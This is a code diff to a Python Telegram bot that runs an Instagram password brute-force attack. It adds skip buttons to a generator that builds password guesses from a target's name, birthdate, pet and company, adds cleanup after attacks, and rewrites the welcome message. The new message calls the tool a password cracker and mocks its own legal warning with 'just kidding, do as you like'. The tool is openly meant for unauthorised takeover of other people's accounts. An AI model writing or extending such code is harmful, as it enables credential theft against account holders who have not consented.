@@ -306,7 +306,7 @@ class InstagramBruteForce:
                 if progress_callback:
                     await progress_callback("🔍 Token bulmaya çalışıyorum, sabret...")
                 await asyncio.sleep(5)
-                attempt += 1
+                continue
             finally:
                 if self.driver:
                     self.driver.quit()
@@ -606,11 +606,25 @@ class TelegramBot:
             if entered_password == BOT_PASSWORD:
                 context.user_data['awaiting'] = None
                 welcome_message = (
-                    "👾 **HACKER V3.0 AKTİF!** 👾\n"
+                    "👾 HACKER V3.0 AKTİF! V.VV SUNAR 👾\n"
                     "🔥 Instagram Brute Force Botuna Hoş Geldin! 🔥\n"
-                    "💻 Bu bot, hedef Instagram hesaplarını test etmek için tasarlandı.\n"
-                    "⚠️ **Yasal Uyarı**: Bu aracı yalnızca kendi hesabınız veya izinli testler için kullanın!\n\n"
-                    "🚀 Başlamak için aşağıdaki seçeneklerden birini seç:"
+                    "Bu bot, Instagram hesaplarını Şşifrelerini kırmak için tasarlandı. Aşağıda botun nasıl çalıştığını ve nasıl kullanacağını adım adım bulabilirsin. ⚠️ Yasal Uyarı: Bu aracı yalnızca kendi hesabın veya izinli testler için kullan! ŞAKA YAPIYORUM TAKIL KAFANA GÖRE\n\n"
+                    "📖 **Botu Nasıl Kullanırım?**\n"
+                    "1. **Kullanıcı Adı Gir**: Hedef Instagram kullanıcı adını belirle.\n"
+                    "2. **Şifre Listesi Yükle veya Oluştur**:\n"
+                    "   - **Yükle**: Hazır bir şifre listesi (.txt) yükleyebilirsin.\n"
+                    "   - **Oluştur**: Ad, soyad, doğum tarihi gibi bilgileri girerek kişiselleştirilmiş bir şifre listesi oluştur. Leet mode, özel karakterler ve rastgele sayılar ekleyebilirsin. Liste oluşturulduktan sonra .txt dosyası olarak indirilebilir!\n"
+                    "3. **Proxy Listesi Yükle** (İsteğe bağlı): Daha güvenli test için proxy listesi (.txt) yükle.\n"
+                    "4. **Timeout Ayarla**: Brute-force işleminin ne kadar süreceğini (saniye cinsinden, 60-7200 arası) belirle.\n"
+                    "5. **Saldırıyı Başlat**: Tüm ayarlar tamamlandıktan sonra brute-force işlemini başlat. İşlem sonunda bir rapor alacaksın:ve unutma biraz sabredeceksin\n"
+                    "   - Denenen şifre sayısı\n"
+                    "   - Hata alınan şifreler burda instagram bazı çakkalıklar yapıyor kankam(doğru olabilir, manuel kontrol et)\n\n"
+                    "💡 **İpuçları**:\n"
+                    "- Bilgi girerken boş bırakmak için \"Boş Bırak\" butonunu kullan.\n"
+                    "- Şifre listesi oluştururken çok fazla kelime eklemek listeyi büyütebilir, dikkatli ol!\n"
+                    "- Hata alırsan, /start ile yeniden başla.\n"
+                    "- Loglar ve hata alınan şifreler instagram_response.json dosyasında saklanır.\n\n"
+                    "🚀 **Başla!** Aşağıdaki seçeneklerden birini seç:"
                 )
                 keyboard = [
                     [InlineKeyboardButton("🎯 Kullanıcı Adı Gir", callback_data='set_username')],
@@ -661,12 +675,16 @@ class TelegramBot:
             return
         elif awaiting == 'generate_firstname':
             self.user_data[user_id]['password_profile']['firstname'] = update.message.text.strip()
-            await update.message.reply_text("📝 Soyadı gir (boş bırakmak için Enter):")
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_lastname')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await update.message.reply_text("📝 Soyadı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
             context.user_data['awaiting'] = 'generate_lastname'
             return
         elif awaiting == 'generate_lastname':
             self.user_data[user_id]['password_profile']['lastname'] = update.message.text.strip()
-            await update.message.reply_text("📝 Doğum tarihi gir (DDMMYYYY, ör: 05071978, boş bırakmak için Enter):")
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_birthdate')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await update.message.reply_text("📝 Doğum tarihi gir (DDMMYYYY, ör: 05071978, boş bırakmak için butona bas):", reply_markup=reply_markup)
             context.user_data['awaiting'] = 'generate_birthdate'
             return
         elif awaiting == 'generate_birthdate':
@@ -675,17 +693,23 @@ class TelegramBot:
                 await update.message.reply_text("❌ Doğum tarihi 8 haneli olmalı (DDMMYYYY)! Tekrar dene:")
                 return
             self.user_data[user_id]['password_profile']['birthdate'] = birthdate
-            await update.message.reply_text("📝 Evcil hayvan adı gir (boş bırakmak için Enter):")
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_pet')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await update.message.reply_text("📝 Evcil hayvan adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
             context.user_data['awaiting'] = 'generate_pet'
             return
         elif awaiting == 'generate_pet':
             self.user_data[user_id]['password_profile']['pet'] = update.message.text.strip()
-            await update.message.reply_text("📝 Şirket adı gir (boş bırakmak için Enter):")
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_company')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await update.message.reply_text("📝 Şirket adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
             context.user_data['awaiting'] = 'generate_company'
             return
         elif awaiting == 'generate_company':
             self.user_data[user_id]['password_profile']['company'] = update.message.text.strip()
-            await update.message.reply_text("📝 Ek anahtar kelimeler gir (virgülle ayır, ör: hacker,juice, boş bırakmak için Enter):")
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_keywords')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await update.message.reply_text("📝 Ek anahtar kelimeler gir (virgülle ayır, ör: hacker,juice, boş bırakmak için butona bas):", reply_markup=reply_markup)
             context.user_data['awaiting'] = 'generate_keywords'
             return
         elif awaiting == 'generate_keywords':
@@ -773,6 +797,38 @@ class TelegramBot:
             await self.generate_password_file(query, user_id)
         elif query.data == 'start_attack':
             await self.start_attack(update, context)
+        elif query.data == 'skip_lastname':
+            self.user_data[user_id]['password_profile']['lastname'] = ''
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_birthdate')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.message.reply_text("📝 Doğum tarihi gir (DDMMYYYY, ör: 05071978, boş bırakmak için butona bas):", reply_markup=reply_markup)
+            context.user_data['awaiting'] = 'generate_birthdate'
+        elif query.data == 'skip_birthdate':
+            self.user_data[user_id]['password_profile']['birthdate'] = ''
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_pet')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.message.reply_text("📝 Evcil hayvan adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
+            context.user_data['awaiting'] = 'generate_pet'
+        elif query.data == 'skip_pet':
+            self.user_data[user_id]['password_profile']['pet'] = ''
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_company')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.message.reply_text("📝 Şirket adı gir (boş bırakmak için butona bas):", reply_markup=reply_markup)
+            context.user_data['awaiting'] = 'generate_company'
+        elif query.data == 'skip_company':
+            self.user_data[user_id]['password_profile']['company'] = ''
+            keyboard = [[InlineKeyboardButton("Boş Bırak", callback_data='skip_keywords')]]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.message.reply_text("📝 Ek anahtar kelimeler gir (virgülle ayır, ör: hacker,juice, boş bırakmak için butona bas):", reply_markup=reply_markup)
+            context.user_data['awaiting'] = 'generate_keywords'
+        elif query.data == 'skip_keywords':
+            self.user_data[user_id]['password_profile']['keywords'] = []
+            keyboard = [
+                [InlineKeyboardButton("Evet", callback_data='leet_yes'), InlineKeyboardButton("Hayır", callback_data='leet_no')]
+            ]
+            reply_markup = InlineKeyboardMarkup(keyboard)
+            await query.message.reply_text("🔢 Leet mode? (ör: leet → 1337)", reply_markup=reply_markup)
+            context.user_data['awaiting'] = 'generate_leet'
         else:
             await query.message.reply_text("❌ Geçersiz işlem! Lütfen /start ile yeniden başla.")
 
@@ -863,6 +919,14 @@ class TelegramBot:
         finally:
             if user_id in self.brute_force_tasks:
                 del self.brute_force_tasks[user_id]
+            # Dosya temizliği
+            for file_path in [self.user_data[user_id]['password_file'], self.user_data[user_id]['proxy_file']]:
+                if file_path and os.path.exists(file_path):
+                    try:
+                        os.remove(file_path)
+                        await query.message.reply_text(f"🗑️ Dosya silindi: {file_path}")
+                    except Exception as e:
+                        logger.error(f"Dosya silme hatası: {file_path}, {str(e)}")
 
 async def main():
     bot = TelegramBot()
